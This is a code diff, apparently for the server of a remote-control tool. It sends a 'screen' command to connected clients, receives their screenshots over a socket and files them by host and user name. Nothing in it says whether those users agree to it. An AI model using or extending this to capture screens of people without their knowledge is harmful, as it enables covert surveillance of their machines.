@@ -1,7 +1,9 @@
 from datetime import datetime
 from termcolor import colored
+import shutil
 import ntpath
 import time
+import os
 
 
 def bytes_to_number(b):
@@ -11,13 +13,32 @@ def bytes_to_number(b):
     return res
 
 
-def screenshot(con):
+def screenshot(con, root, tmp_availables, clients):
+    # path = ''
+    # user = ''
     d = datetime.now().replace(microsecond=0)
     dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
     print(f"working...")
+    for item in tmp_availables:
+        for conKey, ipValue in clients.items():
+            for ipKey in ipValue.keys():
+                if item[1] == ipKey:
+                    ipval = item[1]
+                    host = item[2]
+                    user = item[3]
+                    path = os.path.join(root, host)
+                    try:
+                        os.makedirs(path)
+
+                    except FileExistsError:
+                        pass
+
     con.send('screen'.encode())
     filenameRecv = con.recv(1024)
     con.send("OK filename".encode())
+    filenameRecv = str(filenameRecv).strip("b'")
+    rootfile = f"{path}\\{filenameRecv}"
+
     time.sleep(0.1)
     name = ntpath.basename(str(filenameRecv).encode())
     size = con.recv(4)
@@ -38,7 +59,12 @@ def screenshot(con):
             current_size += len(data)
             screenshotFile.write(data)
 
-    print(f"[{colored('*', 'green')}]Received: {name[:-1]} \n")
-    con.send(f"Received file: {name[:-1]}\n".encode())
+    print(f"[{colored('*', 'green')}]Received: {name}")
+    con.send(f"Received {name}\n".encode())
+
+    # Move screenshot file to directory
+    src = os.path.abspath(filenameRecv)
+    dst = fr"{path}"
+    shutil.move(src, dst)
 
     return
